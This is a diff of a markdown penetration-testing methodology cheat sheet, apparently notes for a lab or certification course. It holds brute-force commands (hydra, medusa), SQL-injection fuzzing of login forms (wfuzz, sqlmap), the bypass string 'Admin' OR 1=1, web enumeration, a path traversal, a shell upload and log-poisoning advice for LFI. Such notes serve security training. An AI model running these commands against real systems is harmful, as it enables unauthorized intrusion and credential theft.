@@ -88,8 +88,10 @@ ls /..//Windows\\System32\\
 /etc/apache/apache2.conf
 ```
 - Attempt to enumerate files to find credentials, other services running on hidden ports, upload and execute or swap binaries to be run.  
+- 
 #### SSH - likely nothing except a logon vector from enumerated usernames.
 ```hydra -l robert -P fasttrack.txt ssh://192.168.1.20 -t 4```
+
 #### HTTPS - Heartbleed / CRIME / Other similar attacks
 - Read the actual SSL CERT to:
   - find out potential correct vhost to GET
@@ -103,10 +105,12 @@ ls /..//Windows\\System32\\
 ```nikto -h 10.11.1.229```
 ```gobuster -u 10.11.1.229 -w /usr/share/seclist/Discover/Web/common.txt -s 200,204,301,302,307,403,500 -e```
   - ```/dirbuster/medium-2.3```
+  
 #### Browse the website: 
 - Begin burpsuite and foxy proxy - ensure it is mapping
 - Manually browse wegpages, based on output from nikto and gobuster
 - Click ALL links, lookout for: logon page; comment field; LFI/RFI/SQLi -able URL; file upload; interactive OS injection; php files/pages able to be injected.
+
 #### LOGON PAGE:
 - For all logon pages - View ```page-source``` 
 - Password guessing for default webapps (PHPMyAdmin: root/null)
@@ -125,11 +129,17 @@ Admin' OR 1=1-- -
 
 ```medusa 10.11.1.229 -u admin -P passwords.txt -M http -m DIR:/printers -T 10```
 
-```wfuzz -u http://192.168.1.48/index.php -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "uname=admin&psw=FUZZ&btnLogin=Login"```
+```
+wfuzz -u http://192.168.1.48/index.php -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "uname=admin&psw=FUZZ&btnLogin=Login"
+```
 
-```wfuzz --hh 109 -d "myusername=admin&mypassword=FUZZ&Submit=Login" -u "http://192.168.1.20/checklogin.php" -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt```
+```
+wfuzz --hh 109 -d "myusername=admin&mypassword=FUZZ&Submit=Login" -u "http://192.168.1.20/checklogin.php" -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt
+```
 
-```hydra -L names -P /usr/share/wordlists/fasttrack.txt 192.168.1.20 http-post-form "/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password"```
+```
+hydra -L names -P /usr/share/wordlists/fasttrack.txt 192.168.1.20 http-post-form "/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password"
+```
 
 ```sqlmap -u 10.11.1.13 --crawl=1```
 
@@ -151,7 +161,7 @@ move shell.txt
 shell.asp
 ```
 #### LFI/RFI
-Anything that has a       ```http://website/page?=foo```
+Anything that has a   ```http://website/page?=foo```
 
 We are looking for credentials similar to FTP Traversal, as well as a place to run code e.g., 
 contaminate the logs with PHP script.
